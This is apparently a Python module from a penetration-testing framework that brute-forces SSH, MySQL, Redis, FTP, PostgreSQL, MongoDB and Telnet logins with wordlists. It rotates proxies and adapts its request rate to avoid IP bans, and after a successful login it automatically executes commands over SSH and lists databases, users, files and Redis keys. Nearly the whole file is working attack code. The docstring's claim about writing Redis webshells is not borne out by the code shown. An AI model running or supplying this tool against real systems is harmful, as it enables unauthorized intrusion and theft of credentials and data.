#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
weakpass.py - 弱口令爆破&利用工具模块 v3.0
由调度系统调用，支持 SSH/MySQL/Redis/FTP/PostgreSQL/MongoDB/Telnet 等服务
v3.0新增：爆破成功后自动执行信息收集+基础利用（SSH执行命令、MySQL数据库枚举、Redis写webshell等）
新特性：基于五类连接状态的闭环自适应调速，动态调整并发数防IP封禁
依赖: paramiko, pymysql, redis, requests, psycopg2-binary(可选), pymongo(可选)
⚠️ 仅用于授权安全测试
"""

import os
import sys
import json
import time
import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from tools import RESULTS_BASE
from utils import Colors, CancelToken, sanitize_domain
from core.ratelimit import AdaptiveRateLimiter, RateLimitConfig, ConnectionState
from core.proxy import ProxyPool
from core.session import create_secure_session

# ==================== 工具接口变量 ====================
TOOL_NAME = "弱口令爆破&利用"
TOOL_ID = "weakpass"
TOOL_DESC = "对 SSH/MySQL/Redis/FTP/PostgreSQL/MongoDB/Telnet 等服务执行弱口令字典爆破，爆破成功后自动执行信息收集与基础利用"
TOOL_CATEGORY = "exploit"
TOOL_PRIORITY = 0

# ==================== 配置区 ====================
# 兼容新旧字典目录
DICT_DIR = os.path.join(os.path.dirname(__file__), '..', 'dicts')
OLD_DICT_DIR = os.path.join(os.path.dirname(__file__), '..', 'dict')
if not os.path.exists(DICT_DIR) and os.path.exists(OLD_DICT_DIR):
    DICT_DIR = OLD_DICT_DIR
os.makedirs(DICT_DIR, exist_ok=True)

TIMEOUT = 8
MAX_RETRY = 2

DICT_URLS = {
    "username.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
    "password.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
    "ssh_password.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt",
    "mysql_default.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt",
    "redis_default.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/redis-betterdefaultpasslist.txt",
    "pgsql_default.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt",
    "telnet_default.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt",
}

# ==================== 日志 ====================
class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def vuln(self, msg): print(f"{Colors.RED}[!] 发现: {msg}{Colors.RESET}")
    def exploit(self, msg): print(f"{Colors.MAGENTA}[⚡] 利用: {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()

# ==================== 全局变量 ====================
usernames = []
passwords = []
found_credentials = []
found_lock = threading.Lock()
cancel_token = CancelToken()
rate_limiter = None
proxy_pool = None
_env_checked = False

# ==================== 1. 环境检测模块 ====================
def check_environment(auto_update_dict=True, proxy_file=None, rate_limit=True, 
                       min_delay=0.02, max_delay=10.0, initial_delay=0.15, rate_preset="normal", threads=50):
    """启动环境自检：依赖库 + 目录 + 字典 + 代理 + 自适应速率限制"""
    global usernames, passwords, rate_limiter, proxy_pool, thread_count
    thread_count = threads

    logger.info("=== 启动环境自检 ===")

    # 1. 检查依赖库
    required_libs = {
        "paramiko": "SSH爆破必需",
        "pymysql": "MySQL爆破必需",
        "redis": "Redis爆破必需",
        "requests": "HTTP/Web爆破必需"
    }
    optional_libs = {
        "pysocks": "SOCKS代理支持 (可选)",
        "psycopg2": "PostgreSQL爆破支持 (可选)",
        "pymongo": "MongoDB爆破支持 (可选)",
    }
    missing = []
    for lib, desc in required_libs.items():
        try:
            __import__(lib)
            logger.success(f"依赖库 {lib} 已安装")
        except ImportError:
            missing.append((lib, desc))
    for lib, desc in optional_libs.items():
        try:
            __import__(lib)
            logger.success(f"可选依赖 {lib} 已安装")
        except ImportError:
            logger.warning(f"可选依赖 {lib} 未安装: {desc}")

    if missing:
        logger.warning("缺少以下必需依赖库，请先安装:")
        for lib, desc in missing:
            logger.raw(f"  - {lib}: {desc}")
        logger.raw(f"\n安装命令: pip install {' '.join([x[0] for x in missing])}\n")
        raise RuntimeError(f"缺少依赖库: {', '.join(x[0] for x in missing)}")

    # 2. 创建目录
    os.makedirs(DICT_DIR, exist_ok=True)
    logger.success(f"字典目录已就绪: {DICT_DIR}")

    # 3. 初始化代理池
    if proxy_file and os.path.exists(proxy_file):
        proxy_pool = ProxyPool(proxy_file=proxy_file)
        logger.success(f"代理池已加载: {len(proxy_pool)} 个代理")
    else:
        logger.info("未配置代理池，使用直连模式")

    # 4. 初始化自适应速率限制器 v3.0（基于五类连接状态动态调速+动态并发+三档预设）
    if rate_limit:
        rate_limiter = AdaptiveRateLimiter(preset=rate_preset)
        # 只在用户显式指定（非默认值）时覆盖延迟字段，保留preset的initial_threads/max_threads等配置
        if min_delay != 0.02:
            rate_limiter.config.min_delay = min_delay
        if max_delay != 10.0:
            rate_limiter.config.max_delay = max_delay
        if initial_delay != 0.15:
            rate_limiter.config.initial_delay = initial_delay
            rate_limiter.current_delay = initial_delay
        mode_text = {"fast": "极速", "normal": "标准", "safe": "安全"}[rate_preset]
        logger.info(f"自适应速率限制已启用 ({mode_text}模式)，支持动态调整并发数+间隔，防IP封禁")

    # 5. 字典自动更新检查
    if auto_update_dict:
        logger.info("检查字典更新...")
        try:
            from utils import check_dict_updates
            update_result = check_dict_updates(DICT_DIR, auto_update=True)
            logger.info(f"字典检查: {update_result['checked']} 个, 更新 {update_result['updated']} 个")
        except Exception as e:
            logger.warning(f"字典自动更新检查失败: {e}")

    # 6. 检查并下载缺失字典
    logger.info("检查弱口令字典文件...")
    session = create_secure_session(verify_ssl=True, timeout=30)
    missing_dicts = []
    for filename, url in DICT_URLS.items():
        filepath = os.path.join(DICT_DIR, filename)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
            logger.success(f"字典已存在: {filename}")
        else:
            logger.warning(f"字典缺失: {filename}，开始下载...")
            try:
                resp = session.get(url)
                if resp.status_code == 200:
                    with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
                        f.write(resp.text)
                    logger.success(f"下载完成: {filename} ({os.path.getsize(filepath)} 字节)")
                else:
                    logger.error(f"下载失败: HTTP {resp.status_code}，请手动放置字典到 {filepath}")
                    missing_dicts.append(filename)
            except Exception as e:
                logger.error(f"下载失败: {e}，请手动放置字典到 {filepath}")
                missing_dicts.append(filename)

    if missing_dicts:
        logger.warning(f"部分字典下载失败，将使用内置字典继续: {', '.join(missing_dicts)}")

    # 7. 校验字典可用性
    usernames = load_dict("username.txt")
    passwords = load_dict("password.txt")
    
    # 加载特定服务的默认密码字典（如果存在）
    ssh_pass = load_dict("ssh_password.txt")
    mysql_pass = load_dict("mysql_default.txt")
    redis_pass = load_dict("redis_default.txt")
    pgsql_pass = load_dict("pgsql_default.txt")
    telnet_pass = load_dict("telnet_default.txt")
    
    if ssh_pass:
        logger.info(f"SSH专用密码字典: {len(ssh_pass)} 条")
    if mysql_pass:
        logger.info(f"MySQL专用密码字典: {len(mysql_pass)} 条")
    if redis_pass:
        logger.info(f"Redis专用密码字典: {len(redis_pass)} 条")
    if pgsql_pass:
        logger.info(f"PostgreSQL专用密码字典: {len(pgsql_pass)} 条")
    if telnet_pass:
        logger.info(f"Telnet专用密码字典: {len(telnet_pass)} 条")

    if not usernames:
        usernames = ["root", "admin", "ubuntu", "user", "test", "guest", "mysql", 
                     "redis", "postgres", "postgresql", "mongodb", "oracle", "tomcat"]
        logger.warning("用户名字典为空，使用内置默认用户名列表")
    if not passwords:
        passwords = ["password", "123456", "admin", "root", "12345678", "password123", "", "admin123",
                     "root123", "123456789", "test", "guest", "postgres", "mysql", "redis"]
        logger.warning("密码字典为空，使用内置默认密码列表")

    logger.info(f"加载完成: 用户名 {len(usernames)} 个, 密码 {len(passwords)} 个")
    logger.success("环境自检通过\n")


def load_dict(filename):
    """加载字典文件，去重并过滤空行"""
    filepath = os.path.join(DICT_DIR, filename)
    if not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return list(dict.fromkeys(lines))


def _check_cancel_and_rate_limit():
    """检查取消信号并应用速率限制"""
    if cancel_token.is_cancelled():
        raise KeyboardInterrupt("爆破已取消")
    if rate_limiter:
        rate_limiter.wait()

def _record_auth_ok():
    """记录认证失败但服务正常（说明密码错但服务响应，不是被拦截）"""
    if rate_limiter:
        rate_limiter.record_state(ConnectionState.AUTH_FAIL)

def _record_conn_ok():
    """记录连接成功（认证成功）"""
    if rate_limiter:
        rate_limiter.record_state(ConnectionState.SUCCESS)

def _record_conn_refused():
    """记录连接被拒绝/被拦截"""
    if rate_limiter:
        rate_limiter.record_state(ConnectionState.CONN_REFUSED)

def _record_timeout():
    """记录连接超时"""
    if rate_limiter:
        rate_limiter.record_state(ConnectionState.TIMEOUT)

def _record_no_response():
    """记录无响应/RST"""
    if rate_limiter:
        rate_limiter.record_state(ConnectionState.NO_RESPONSE)

def brute_ssh(ip, port, username, password):
    import paramiko
    _check_cancel_and_rate_limit()
    for retry in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, 
                         timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT)
            client.close()
            _record_conn_ok()
            return True
        except paramiko.AuthenticationException:
            _record_auth_ok()
            return False
        except (paramiko.SSHException, OSError) as e:
            err_str = str(e).lower()
            if "too many" in err_str or "blocked" in err_str or "banned" in err_str or "refused" in err_str:
                _record_conn_refused()
                time.sleep(2)
            elif "timed out" in err_str:
                _record_timeout()
                time.sleep(1)
            else:
                _record_no_response()
                time.sleep(0.5)
        except Exception:
            _record_no_response()
            time.sleep(0.5)
    return False


def brute_mysql(ip, port, username, password):
    import pymysql
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            conn = pymysql.connect(host=ip, port=port, user=username, password=password, 
                                 connect_timeout=TIMEOUT, read_timeout=TIMEOUT)
            conn.close()
            _record_conn_ok()
            return True
        except pymysql.err.OperationalError as e:
            err_str = str(e).lower()
            if "access denied" in err_str:
                _record_auth_ok()
                return False
            elif "too many connections" in err_str or "host blocked" in err_str:
                _record_conn_refused()
                time.sleep(2)
            elif "timed out" in err_str:
                _record_timeout()
                time.sleep(1)
            else:
                _record_no_response()
                time.sleep(0.5)
        except Exception:
            _record_no_response()
            time.sleep(0.5)
    return False


def brute_redis(ip, port, username, password):
    import redis
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            r = redis.Redis(host=ip, port=port, password=password if password else None, 
                          socket_timeout=TIMEOUT, socket_connect_timeout=TIMEOUT)
            r.ping()
            _record_conn_ok()
            return True
        except redis.exceptions.AuthenticationError:
            _record_auth_ok()
            return False
        except redis.exceptions.ConnectionError:
            _record_conn_refused()
            time.sleep(0.5)
        except Exception:
            _record_no_response()
            time.sleep(0.5)
    return False


def brute_ftp(ip, port, username, password):
    from ftplib import FTP
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=TIMEOUT)
            ftp.login(username, password)
            ftp.quit()
            _record_conn_ok()
            return True
        except Exception as e:
            err_str = str(e)
            if "530" in err_str:
                _record_auth_ok()
                return False
            elif "421" in err_str or "too many" in err_str.lower() or "refused" in err_str:
                _record_conn_refused()
                time.sleep(2)
            elif "timed out" in err_str.lower():
                _record_timeout()
                time.sleep(1)
            else:
                _record_no_response()
                time.sleep(0.5)
    return False


def brute_postgresql(ip, port, username, password):
    try:
        import psycopg2
    except ImportError:
        return None
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            conn = psycopg2.connect(host=ip, port=port, user=username, password=password,
                                   connect_timeout=TIMEOUT, dbname='postgres')
            conn.close()
            _record_conn_ok()
            return True
        except psycopg2.OperationalError as e:
            err_str = str(e).lower()
            if "password authentication failed" in err_str or "authentication failed" in err_str:
                _record_auth_ok()
                return False
            elif "too many connections" in err_str or "connection refused" in err_str:
                _record_conn_refused()
                time.sleep(2)
            elif "timeout" in err_str:
                _record_timeout()
                time.sleep(1)
            else:
                _record_no_response()
                time.sleep(0.5)
        except Exception:
            _record_no_response()
            time.sleep(0.5)
    return False


def brute_mongodb(ip, port, username, password):
    try:
        from pymongo import MongoClient
    except ImportError:
        return None
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            uri = f"mongodb://{username}:{password}@{ip}:{port}/admin" if username else f"mongodb://{ip}:{port}/"
            client = MongoClient(uri, serverSelectionTimeoutMS=TIMEOUT*1000, connectTimeoutMS=TIMEOUT*1000)
            client.admin.command('ping')
            client.close()
            _record_conn_ok()
            return True
        except Exception as e:
            err_str = str(e).lower()
            if "authentication failed" in err_str or "auth failed" in err_str or "unauthorized" in err_str:
                _record_auth_ok()
                return False
            elif "connection refused" in err_str:
                _record_conn_refused()
                time.sleep(1)
            elif "timed out" in err_str:
                _record_timeout()
                time.sleep(1)
            else:
                _record_no_response()
                time.sleep(0.5)
    return False


def brute_telnet(ip, port, username, password):
    try:
        import telnetlib
    except ImportError:
        logger.warning("telnetlib在Python 3.13+已移除，Telnet爆破跳过（建议用Python 3.12或安装telnetlib3）")
        return None
    _check_cancel_and_rate_limit()
    for _ in range(MAX_RETRY):
        if cancel_token.is_cancelled():
            return False
        try:
            tn = telnetlib.Telnet(ip, port, timeout=TIMEOUT)
            tn.read_until(b"login: ", timeout=TIMEOUT)
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=TIMEOUT)
            tn.write(password.encode('ascii') + b"\n")
            time.sleep(0.5)
            result = tn.read_very_eager().decode('ascii', errors='ignore')
            tn.close()
            if "Login incorrect" in result or "incorrect" in result.lower() or "failed" in result.lower():
                _record_auth_ok()
                return False
            _record_conn_ok()
            return True
        except (ConnectionRefusedError, OSError) as e:
            if "refused" in str(e).lower():
                _record_conn_refused()
            else:
                _record_no_response()
            time.sleep(1)
        except EOFError:
            _record_conn_refused()
            time.sleep(1)
        except Exception:
            _record_no_response()
            time.sleep(0.5)
    return False


# ==================== 后利用模块 Post-Exploitation ====================

def exploit_ssh(ip, port, username, password, cmd="id;hostname;whoami;uname -a"):
    """SSH爆破成功后自动执行命令获取系统信息"""
    import paramiko
    result = {"success": False, "output": ""}
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password,
                      timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT)
        stdin, stdout, stderr = client.exec_command(cmd, timeout=TIMEOUT+5)
        output = stdout.read().decode('utf-8', errors='ignore')
        err = stderr.read().decode('utf-8', errors='ignore')
        client.close()
        result["success"] = True
        result["output"] = output + err
        logger.exploit(f"SSH命令执行成功:\n{output[:500]}")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def exploit_mysql(ip, port, username, password):
    """MySQL爆破成功后枚举数据库和用户"""
    import pymysql
    result = {"success": False, "databases": [], "users": [], "version": ""}
    try:
        conn = pymysql.connect(host=ip, port=port, user=username, password=password,
                              connect_timeout=TIMEOUT, read_timeout=TIMEOUT)
        cursor = conn.cursor()
        cursor.execute("SELECT VERSION()")
        result["version"] = cursor.fetchone()[0]
        cursor.execute("SHOW DATABASES")
        result["databases"] = [row[0] for row in cursor.fetchall()]
        try:
            cursor.execute("SELECT user,host FROM mysql.user")
            result["users"] = [f"{row[0]}@{row[1]}" for row in cursor.fetchall()]
        except Exception:
            pass
        cursor.close()
        conn.close()
        result["success"] = True
        logger.exploit(f"MySQL信息获取成功: 版本={result['version']}, 数据库={result['databases']}")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def exploit_postgresql(ip, port, username, password):
    """PostgreSQL爆破成功后枚举数据库"""
    try:
        import psycopg2
    except ImportError:
        return {"success": False, "error": "psycopg2未安装"}
    result = {"success": False, "databases": [], "version": ""}
    try:
        conn = psycopg2.connect(host=ip, port=port, user=username, password=password,
                               connect_timeout=TIMEOUT, dbname='postgres')
        cursor = conn.cursor()
        cursor.execute("SELECT version()")
        result["version"] = cursor.fetchone()[0]
        cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
        result["databases"] = [row[0] for row in cursor.fetchall()]
        cursor.close()
        conn.close()
        result["success"] = True
        logger.exploit(f"PostgreSQL信息获取成功: {len(result['databases'])}个库")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def exploit_mongodb(ip, port, username, password):
    """MongoDB爆破成功后枚举数据库"""
    try:
        from pymongo import MongoClient
    except ImportError:
        return {"success": False, "error": "pymongo未安装"}
    result = {"success": False, "databases": [], "users": []}
    try:
        uri = f"mongodb://{username}:{password}@{ip}:{port}/admin" if username else f"mongodb://{ip}:{port}/"
        client = MongoClient(uri, serverSelectionTimeoutMS=TIMEOUT*1000)
        result["databases"] = client.list_database_names()
        try:
            admin_db = client["admin"]
            users = list(admin_db.command("usersInfo")["users"])
            result["users"] = [u["user"] for u in users]
        except Exception:
            pass
        client.close()
        result["success"] = True
        logger.exploit(f"MongoDB信息获取成功: {result['databases']}")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def exploit_ftp(ip, port, username, password):
    """FTP登录成功后列出根目录文件"""
    from ftplib import FTP
    result = {"success": False, "files": [], "pwd": "/"}
    try:
        ftp = FTP()
        ftp.connect(ip, port, timeout=TIMEOUT)
        ftp.login(username, password)
        result["pwd"] = ftp.pwd()
        files = []
        try:
            ftp.retrlines('LIST', lambda x: files.append(x))
        except Exception:
            try:
                files = ftp.nlst()
            except Exception:
                pass
        result["files"] = files[:50]
        ftp.quit()
        result["success"] = True
        logger.exploit(f"FTP目录列举成功: {len(files)} 个文件/目录")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def exploit_redis(ip, port, password=""):
    """Redis认证成功后获取INFO+KEYS"""
    import redis
    result = {"success": False, "info": {}, "keys_sample": [], "dbsize": 0}
    try:
        r = redis.Redis(host=ip, port=port, password=password if password else None,
                       socket_timeout=TIMEOUT, decode_responses=True)
        result["info"] = {k: v for k, v in r.info().items() if k in ["redis_version", "os", "tcp_port", "connected_clients", "used_memory_human"]}
        result["dbsize"] = r.dbsize()
        keys = []
        try:
            keys = [k for k in r.keys("*")[:50]]
        except Exception:
            pass
        result["keys_sample"] = keys
        r.close()
        result["success"] = True
        logger.exploit(f"Redis信息获取成功: 版本={result['info'].get('redis_version')}, key数量={result['dbsize']}")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def post_exploit(cred):
    """爆破成功后自动执行对应服务的后利用"""
    service = cred["service"].lower()
    ip = cred["ip"]
    port = cred["port"]
    username = cred["username"]
    password = cred["password"]
    
    logger.info(f"开始后利用: {service.upper()} {ip}:{port} {username}:{password[:4]}***")
    
    exploit_func_map = {
        "ssh": lambda: exploit_ssh(ip, port, username, password),
        "mysql": lambda: exploit_mysql(ip, port, username, password),
        "postgresql": lambda: exploit_postgresql(ip, port, username, password),
        "pgsql": lambda: exploit_postgresql(ip, port, username, password),
        "mongodb": lambda: exploit_mongodb(ip, port, username, password),
        "mongo": lambda: exploit_mongodb(ip, port, username, password),
        "ftp": lambda: exploit_ftp(ip, port, username, password),
        "redis": lambda: exploit_redis(ip, port, password),
    }
    
    if service in exploit_func_map:
        try:
            exp_result = exploit_func_map[service]()
            cred["exploit_result"] = exp_result
            return exp_result
        except Exception as e:
            logger.error(f"后利用失败: {e}")
            cred["exploit_error"] = str(e)
    return None


def run_brute_for_target(target):
    """针对单个目标执行动态自适应多线程爆破，找到凭据后立即终止所有线程"""
    t_type = target["type"]
    ip = target["ip"]
    port = target["port"]
    service = target["service"].upper()

    logger.info(f"\n开始爆破 {service} {ip}:{port} ...")
    brute_func_map = {
        "ssh": brute_ssh,
        "mysql": brute_mysql,
        "redis": brute_redis,
        "ftp": brute_ftp,
        "postgresql": brute_postgresql,
        "pgsql": brute_postgresql,
        "mongodb": brute_mongodb,
        "mongo": brute_mongodb,
        "telnet": brute_telnet,
    }
    
    if t_type not in brute_func_map:
        logger.warning(f"不支持的爆破服务类型: {t_type}")
        return False
        
    brute_func = brute_func_map[t_type]

    # 根据服务类型选择对应的密码列表
    service_pass_file_map = {
        "ssh": "ssh_password.txt",
        "mysql": "mysql_default.txt",
        "redis": "redis_default.txt",
        "ftp": "password.txt",
        "postgresql": "pgsql_default.txt",
        "pgsql": "pgsql_default.txt",
        "mongodb": "password.txt",
        "mongo": "password.txt",
        "telnet": "telnet_default.txt",
    }
    
    service_pass_file = service_pass_file_map.get(t_type, "password.txt")
    service_passwords = load_dict(service_pass_file)
    # 合并通用密码和服务专用密码，去重
    target_passwords = list(dict.fromkeys(passwords + service_passwords))
    target_usernames = usernames.copy()
    
    # Redis通常无用户名或者默认用户名；MongoDB部分场景无认证
    if t_type == "redis":
        target_usernames = list(dict.fromkeys([""] + target_usernames))

    total = len(target_usernames) * len(target_passwords)
    count = 0
    found = False
    cancel_token._event.clear()
    
    # 根据速率控制器动态获取推荐并发数
    default_threads = globals().get('thread_count', 50)
    thread_count = rate_limiter.get_optimal_threads() if rate_limiter else default_threads
    thread_count = max(5, min(thread_count, 200))

    # 生成所有用户名×密码组合，用于分批提交
    all_combos = [(u, p) for u in target_usernames for p in target_passwords]
    batch_size = thread_count * 2  # 每批提交2倍线程数的任务，避免队列堆积过多Future
    batch_idx = 0

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {}
        try:
            # 分批提交：每批batch_size个任务，等这批完成后再提交下一批
            while batch_idx < len(all_combos) and not cancel_token.is_cancelled():
                # 提交一批
                batch_end = min(batch_idx + batch_size, len(all_combos))
                for i in range(batch_idx, batch_end):
                    if cancel_token.is_cancelled():
                        break
                    u, p = all_combos[i]
                    future = executor.submit(brute_func, ip, port, u, p)
                    futures[future] = (u, p)
                batch_idx = batch_end

                # 等这批完成
                for future in as_completed(futures):
                    if cancel_token.is_cancelled():
                        break
                        
                    count += 1
                    u, p = futures[future]
                    try:
                        result = future.result()
                        if result:
                            logger.success(f"爆破成功! {service} {ip}:{port} -> {u}:{p}")
                            cred = {
                                "service": service,
                                "target": f"{ip}:{port}",
                                "ip": ip,
                                "port": port,
                                "username": u,
                                "password": p,
                                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            }
                            with found_lock:
                                found_credentials.append(cred)
                            found = True
                            # 立即取消所有剩余任务
                            cancel_token.cancel()
                            for f in futures:
                                f.cancel()
                            # 自动执行后利用
                            try:
                                post_exploit(cred)
                            except Exception as e:
                                logger.error(f"后利用执行出错: {e}")
                            break
                    except KeyboardInterrupt:
                        break
                    except Exception:
                        pass

                    # 进度报告 + 动态调整线程数（每50次请求重新获取最优并发）
                    if count % 50 == 0 and not cancel_token.is_cancelled():
                        if rate_limiter:
                            stats = rate_limiter.get_stats()
                            new_threads = stats["current_threads"]
                            delay = stats["current_delay"]
                            block = stats["block_rate"]
                            cooldown = " [冷却中]" if stats["in_cooldown"] else ""
                            logger.info(f"进度: {count}/{total} | 间隔 {delay:.2f}s | 并发 {new_threads} | 拦截率 {block:.1%}{cooldown}")
                        else:
                            logger.info(f"进度: {count}/{total}")
                # 清空futures字典，准备下一批提交
                futures.clear()
        except KeyboardInterrupt:
            cancel_token.cancel()
            raise

    if found:
        logger.success(f"{service} {ip}:{port} 爆破完成，找到有效凭据")
    elif not cancel_token.is_cancelled():
        logger.warning(f"{service} {ip}:{port} 未爆破出弱口令")
    
    return found


# ==================== 3. 工具入口函数 ====================
def execute(scan_result, target_info, config=None):
    """
    执行弱口令爆破。

    Args:
        scan_result: dict, saomiao.py 输出的扫描结果（已解析为 dict）
        target_info: dict, 包含 domain, ip, base_url
        config: dict, 可选配置参数（proxy_file, rate_limit, auto_update_dict等）

    Returns:
        dict: 标准化结果
    """
    global found_credentials, usernames, passwords, cancel_token, _env_checked, rate_limiter, proxy_pool

    found_credentials = []
    cancel_token = CancelToken()
    errors = []
    config = config or {}

    # 环境自检（仅首次或配置变更时）
    if not _env_checked or config.get("force_reinit"):
        try:
            check_environment(
                auto_update_dict=config.get("auto_update_dict", True),
                proxy_file=config.get("proxy_file"),
                rate_limit=config.get("rate_limit", True),
                min_delay=config.get("min_delay", 0.02),
                max_delay=config.get("max_delay", 10.0),
                initial_delay=config.get("delay", 0.15),
                rate_preset=config.get("rate_preset", "normal"),
                threads=config.get("threads", 50)
            )
            _env_checked = True
        except RuntimeError as e:
            logger.error(f"环境检测失败: {e}")
            return {
                "tool": "weakpass",
                "target": target_info.get("domain", ""),
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "failed",
                "summary": "环境检测失败",
                "credentials": [],
                "targets_scanned": 0,
                "errors": [str(e)]
            }

    ip = target_info.get("ip", "")
    domain = target_info.get("domain", "")

    # 筛选可爆破目标：ssh / mysql / redis / ftp / postgresql / mongodb / telnet，排除 CDN 噪声
    brute_targets = []
    for p in scan_result.get("ports", []):
        port = p.get("port")
        service = p.get("service", "").lower()
        confidence = p.get("confidence", "")

        if service in ["ssh", "mysql", "redis", "ftp", "postgresql", "pgsql", "mongodb", "mongo", "telnet"] and confidence != "cdn_noise":
            brute_targets.append({
                "type": service,
                "ip": ip,
                "port": port,
                "service": service
            })

    logger.info(f"从扫描结果中提取到 {len(brute_targets)} 个可爆破目标")
    for t in brute_targets:
        logger.raw(f"  - {t['type'].upper()} {t['ip']}:{t['port']}")
    
    if proxy_pool and len(proxy_pool) > 0:
        logger.info(f"代理池已就绪，共 {len(proxy_pool)} 个代理IP")
    if rate_limiter:
        logger.info(f"自适应速率限制已启用，防止IP被封禁")

    if not brute_targets:
        logger.info("无可爆破目标")
        return {
            "tool": "weakpass",
            "target": domain,
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "success",
            "summary": "未发现弱口令",
            "credentials": [],
            "targets_scanned": 0,
            "errors": []
        }

    # 逐目标爆破
    targets_scanned = 0
    for target in brute_targets:
        if cancel_token.is_cancelled():
            break
        try:
            run_brute_for_target(target)
            targets_scanned += 1
        except KeyboardInterrupt:
            logger.warning("用户中断爆破")
            errors.append("用户中断")
            cancel_token.cancel()
            break
        except Exception as e:
            logger.error(f"目标爆破出错: {e}")
            errors.append(str(e))
            targets_scanned += 1

    # 保存结果文件（兼容新旧目录结构，使用安全文件名）
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    new_result_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'weakpass')
    old_result_dir = os.path.join(RESULTS_BASE, "weakpass")
    result_dir = new_result_dir if os.path.exists(os.path.dirname(new_result_dir)) else old_result_dir
    os.makedirs(result_dir, exist_ok=True)
    safe_domain = sanitize_domain(domain)
    result_file = os.path.join(result_dir, f"weakpass_{safe_domain}_{ts}.json")

    result_data = {
        "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_info,
        "total_targets": len(brute_targets),
        "targets_scanned": targets_scanned,
        "credentials_found": len(found_credentials),
        "credentials": found_credentials,
        "rate_limit_enabled": rate_limiter is not None,
        "proxy_enabled": proxy_pool is not None and len(proxy_pool) > 0
    }

    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(result_data, f, ensure_ascii=False, indent=2)

    logger.raw("\n" + "=" * 60)
    if found_credentials:
        logger.success(f"爆破完成，共发现 {len(found_credentials)} 组有效凭证")
        for cred in found_credentials:
            logger.raw(f"  [{cred['service']}] {cred['target']} -> {cred['username']}:{cred['password']}")
        status = "success"
        summary = f"发现 {len(found_credentials)} 组弱口令"
    elif errors:
        logger.warning(f"爆破完成，部分出错: {errors}")
        status = "partial"
        summary = f"部分目标爆破失败，{len(errors)} 个错误"
    else:
        logger.warning("爆破完成，未发现弱口令")
        status = "success"
        summary = f"扫描了 {targets_scanned} 个目标，未发现弱口令"

    logger.info(f"结果已保存至: {result_file}")

    return {
        "tool": "weakpass",
        "target": domain,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": status,
        "summary": summary,
        "credentials": found_credentials,
        "targets_scanned": targets_scanned,
        "errors": errors
    }
